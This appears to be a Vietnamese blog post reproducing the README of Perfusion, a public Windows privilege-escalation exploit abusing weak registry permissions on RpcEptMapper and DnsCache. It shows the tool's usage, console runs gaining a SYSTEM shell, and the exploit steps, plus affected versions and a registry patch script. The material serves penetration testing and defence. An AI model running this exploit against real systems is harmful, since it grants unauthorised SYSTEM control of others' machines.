---
title: Perfusion
date: 12/11/2021
layout: single
header:
  teaser: https://anomali.cdn.rackfoundry.net/images/made/images/uploads/blog/ogThe-Power-of-an-Exploit_1200_603.jpg
---

# Mô tả
Tác giả: itm4n

Mã Nguồn: [itm4n/Perfusion](https://github.com/itm4n/Perfusion) 

> Trong __Windows 7__, __Windows Server 2008R2__, __Windows 8__, và __Windows Server 2012__, khóa đăng ký của dịch vụ `RpcEptMapper` và` DnsCache` (chỉ dành cho 7 / 2008R2) được định cấu hình với quyền yếu. Bất kỳ người dùng cục bộ nào cũng có thể tạo khóa con `Performance` và sau đó tận dụng ___Windows Performance Counters___ để tải một DLL tùy ý trong ngữ cảnh của dịch vụ WMI là` NT AUTHORITY \ SYSTEM` (do đó có tên là công cụ).

>  Công cụ này nhằm giúp các nhà tư vấn bảo mật trong quá trình kiểm tra thâm nhập. Phần mềm này được cung cấp nguyên trạng và tác giả có thể sẽ không cung cấp bất kỳ hỗ trợ nào. Mặc dù vậy, tôi đã thử nghiệm nó kỹ lưỡng trên ba máy ảo khác nhau nên không có vấn đề gì đáng kể.

Một bài phân tích chi tiết về nó: [windows-registry-rpceptmapper-eop/](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

<p align="center">
  <img src="https://raw.githubusercontent.com/itm4n/Perfusion/master/demo.gif">
</p>

## Nguồn thông tin: 2021-04-21 Cập nhật

> Theo [0patch](https://twitter.com/0patch/status/1384495698373120002), lỗ hổng này đã được sửa một phần với Bản cập nhật Windows tháng 4 năm 2021 (ESU). Điều này có nghĩa là các máy chạy phiên bản cập nhật của Windows 8 / Server 2012 sẽ không thể khai thác được nữa. Tuy nhiên, Windows 7 / Server 2008 R2 vẫn dễ bị tấn công. Bạn chỉ cần sử dụng khóa đăng ký `Dnscache` hơn là `RpcEptMapper`. Tôi đã cập nhật PoC để bạn có thể chỉ định thủ công bằng tùy chọn `-k`.

```powershell
C:\Temp>Perfusion.exe -c cmd -i
[*] Created Performance DLL: C:\Users\Lab-User\AppData\Local\Temp\performance_2900_368_1.dll
[*] Created Performance registry key.
[*] Triggered Performance data collection.
[+] Exploit completed. Got a SYSTEM token! :)
[*] Waiting for the Trigger Thread to terminate... OK
[*] Deleted Performance registry key.
[*] Deleted Performance DLL.
Microsoft Windows [Version 6.2.9200]
(c) 2012 Microsoft Corporation. All rights reserved.

C:\Temp>whoami
nt authority\system

C:\Temp>
```

:x: Đây là những gì bạn sẽ thấy khi khai thác không thành công

```powershell
C:\Temp>Perfusion.exe -c cmd -i
[*] Created Performance DLL: C:\Users\Lab-User\AppData\Local\Temp\performance_636_3000_1.dll
[*] Created Performance registry key.
[*] Triggered Performance data collection.
[-] Exploit completed but no SYSTEM Token. :/
[*] Waiting for the Trigger Thread to terminate... OK
[*] Deleted Performance registry key.
[*] Deleted Performance DLL.

C:\Temp>
```

## Build instructions

Giải pháp này bao gồm hai dự án cần được biên dịch theo một thứ tự cụ thể. Mọi thứ đều được định cấu hình trước, vì vậy bạn chỉ cần làm theo các hướng dẫn đơn giản sau

1. Mở Giải pháp với Visual Studio 2019
2. Select `Release / x64`
3. `Build > Build Solution`

## Usage

Bạn có thể kiểm tra thông báo trợ giúp bằng cách sử dụng tùy chọn `-h`.

```powershell
C:\TOOLS>Perfusion.exe -h
 _____         ___         _
|  _  |___ ___|  _|_ _ ___|_|___ ___
|   __| -_|  _|  _| | |_ -| | . |   |  version 0.2
|__|  |___|_| |_| |___|___|_|___|_|_|  by @itm4n

Description:
  Exploit tool for the RpcEptMapper registry key vulnerability.

Options:
  -c <CMD>  Command - Execute the specified command line
  -i        Interactive - Interact with the process (default: non-interactive)
  -d        Desktop - Spawn a new process on your desktop (default: hidden)
  -k <KEY>  Key - Either 'RpcEptMapper' or 'Dnscache' (default: 'RpcEptMapper')
  -h        Help - That's me :)
```

## Remediation / Patch

Các phiên bản Windows sau dễ bị tấn công:

| Windows version | Vulnerable registry keys |
| --- | --- |
| Windows 7 | RpcEptMapper, DnsCache |
| Windows Server 2008R2 | RpcEptMapper, DnsCache |
| Windows 8 | RpcEptMapper |
| Windows Server 2012 | RpcEptMapper |

> Theo những gì tôi được biết, lỗ hổng này sẽ không được Microsoft sửa chữa vì một số lý do. Giải pháp tốt nhất vẫn là nâng cấp lên Windows 10 / Server 2019 nhưng nếu đó không phải là lựa chọn ngắn hạn, bạn vẫn có thể tự vá sự cố này bằng cách xóa quyền `CreateSubKey` cho cả `NT AUTHORITY\Authenticated Users` và `BUILTIN\Users` trên các khóa đăng ký sau:

- `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`
- `HKLM\SYSTEM\CurrentControlSet\Services\DnsCache`

> Tác giả đã tạo bản vá cho lỗ hổng bảo mật này dưới dạng tập lệnh PowerShell: [RegistryPatch.ps1] (RegistryPatch.ps1). Tập lệnh này loại bỏ `CreateSubKey` ngay trên hai khóa đăng ký nêu trên cho các danh tính sau:` NT AUTHORITY \ INTERACTIVE`, `BUILTIN \ Users` và / hoặc` BUILTIN \ Authenticated Users`

- __Kiểm tra xem máy có dễ bị tổn thương không:__ (Windows Server 2012 here)

```powershell
PS C:\Temp> . .\RegistryPatch.ps1; Invoke-RegistryPatch -Verbose
VERBOSE: Registry key: HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper
VERBOSE: Found a vulnerable ACE: "NT AUTHORITY\Authenticated Users" has "QueryValues, CreateSubKey, ReadPermissions" rights
VERBOSE: InheritanceFlags: None
VERBOSE: IsInherited: False
VERBOSE: Registry key: HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper
VERBOSE: Found a vulnerable ACE: "BUILTIN\Users" has "QueryValues, CreateSubKey, Notify" rights
VERBOSE: InheritanceFlags: None
VERBOSE: IsInherited: False
True
```

- __Áp dụng các bản vá:__ (Windows Server 2008 R2 here)

```powershell
PS C:\Temp> . .\RegistryPatch.ps1; Invoke-RegistryPatch -Patch -Verbose 
VERBOSE: Registry key: HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper
VERBOSE: Found a vulnerable ACE: "NT AUTHORITY\Authenticated Users" has "QueryValues, CreateSubKey, ReadPermissions" rights
VERBOSE: InheritanceFlags: None
VERBOSE: IsInherited: False
VERBOSE: Registry key: HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper
VERBOSE: Found a vulnerable ACE: "BUILTIN\Users" has "QueryValues, CreateSubKey, Notify" rights
VERBOSE: InheritanceFlags: None
VERBOSE: IsInherited: False
VERBOSE: Registry key: HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper
VERBOSE: The new ACL was applied
VERBOSE: Registry key: HKLM\SYSTEM\CurrentControlSet\Services\DnsCache
VERBOSE: Found a vulnerable ACE: "NT AUTHORITY\INTERACTIVE" has "QueryValues, CreateSubKey, EnumerateSubKeys, ReadPermissions" rights
VERBOSE: InheritanceFlags: None
VERBOSE: IsInherited: False
VERBOSE: Registry key: HKLM\SYSTEM\CurrentControlSet\Services\DnsCache
VERBOSE: Found a vulnerable ACE: "BUILTIN\Users" has "CreateSubKey, ReadKey" rights
VERBOSE: InheritanceFlags: None
VERBOSE: IsInherited: False
VERBOSE: Registry key: HKLM\SYSTEM\CurrentControlSet\Services\DnsCache
VERBOSE: The new ACL was applied
True
```

## How does this exploit work?

Dưới đây là các bước khai thác được thực hiện trong công cụ này:

1. Tiến trình được tạo ở chế độ nền ở trạng thái treo (sử dụng dòng lệnh được chỉ định).
2. DLL trọng tải nhúng được ghi vào thư mục `Temp` của người dùng hiện tại.
3. Khóa `Performance` được tạo trong` HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper` và được điền các giá trị thích hợp, bao gồm cả đường dẫn đầy đủ của DLL đã được tạo ở bước 2.
4. Lớp WMI `Win32_Perf` được tạo và gọi để kích hoạt bộ sưu tập _Windows Performance Counters_.
5. DLL được tải bởi dịch vụ WMI dưới dạng `NT AUTHORITY\SYSTEM` hoặc` NT AUTHORITY\LOCAL SERVICE`.
6. Nếu DLL được tải bởi `NT AUTHORITY\SYSTEM`, Mã thông báo của nó sẽ được sao chép và được áp dụng cho Quy trình do người dùng tạo ban đầu ở bước 1.
7. Mọi thứ được dọn dẹp và Chủ đề chính của Quy trình bị treo được tiếp tục.
